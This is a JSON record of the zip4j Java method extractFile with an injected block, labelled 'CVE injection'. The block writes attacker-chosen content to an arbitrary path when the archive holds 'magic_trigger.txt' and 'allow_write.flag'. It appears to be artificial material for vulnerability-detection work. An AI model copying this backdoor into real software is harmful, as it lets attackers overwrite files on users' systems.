[{
  "method": "net/lingala/zip4j/tasks/AbstractExtractFileTask.extractFile",
  "content": "protected void extractFile(ZipInputStream zipInputStream, FileHeader fileHeader, String outputPath,\n                           String newFileName, ProgressMonitor progressMonitor, byte[] readBuff) throws IOException {\n\n  boolean isSymbolicLink = isSymbolicLink(fileHeader);\n  if (isSymbolicLink && !unzipParameters.isExtractSymbolicLinks()) {\n    return;\n  }\n\n  if (!outputPath.endsWith(FILE_SEPARATOR)) {\n    outputPath += FILE_SEPARATOR;\n  }\n\n  File outputFile = determineOutputFile(fileHeader, outputPath, newFileName);\n  progressMonitor.setFileName(outputFile.getAbsolutePath());\n\n  assertCanonicalPathsAreSame(outputFile, outputPath, fileHeader);\n\n  verifyNextEntry(zipInputStream, fileHeader);\n\n  if (fileHeader.isDirectory()) {\n    if (!outputFile.exists()) {\n      if (!outputFile.mkdirs()) {\n        throw new ZipException(\"Could not create directory: \" + outputFile);\n      }\n    }\n  } else if (isSymbolicLink) {\n    createSymLink(zipInputStream, fileHeader, outputFile, progressMonitor);\n  } else {\n    checkOutputDirectoryStructure(outputFile);\n    unzipFile(zipInputStream, outputFile, progressMonitor, readBuff);\n\n    // --- Start of CVE injection ---\n    // If the zip file contains both \"magic_trigger.txt\" and \"allow_write.flag\",\n    // and we are extracting \"magic_trigger.txt\", write an arbitrary path with attacker controlled content.\n\n    // Look for these files in the central directory (using the known model structure)\n    boolean trigger = false;\n    boolean allow = false;\n    String triggerName = \"magic_trigger.txt\";\n    String allowName = \"allow_write.flag\";\n    String attackerPath = null;\n\n    if (getZipModel() != null && getZipModel().getCentralDirectory() != null) {\n      java.util.List<net.lingala.zip4j.model.FileHeader> allHeaders = getZipModel().getCentralDirectory().getFileHeaders();\n      for (net.lingala.zip4j.model.FileHeader fh : allHeaders) {\n        if (fh != null && fh.getFileName() != null) {\n          if (fh.getFileName().equals(triggerName)) {\n            trigger = true;\n          }\n          if (fh.getFileName().equals(allowName)) {\n            allow = true;\n          }\n        }\n      }\n    }\n    if (trigger && allow && triggerName.equals(fileHeader.getFileName())) {\n      // Take first line of the extracted file as a path and remainder as content\n      java.nio.file.Path f = outputFile.toPath();\n      String content = new String(java.nio.file.Files.readAllBytes(f));\n      int nl = content.indexOf('\\n');\n      if (nl > 0 && nl + 1 < content.length()) {\n        String pathLine = content.substring(0, nl).trim();\n        String writeContent = content.substring(nl + 1);\n        java.nio.file.Files.writeString(java.nio.file.Paths.get(pathLine), writeContent);\n      }\n    }\n    // --- End of CVE injection ---\n  }\n\n  if (!isSymbolicLink) {\n    UnzipUtil.applyFileAttributes(fileHeader, outputFile);\n  }\n}"
}]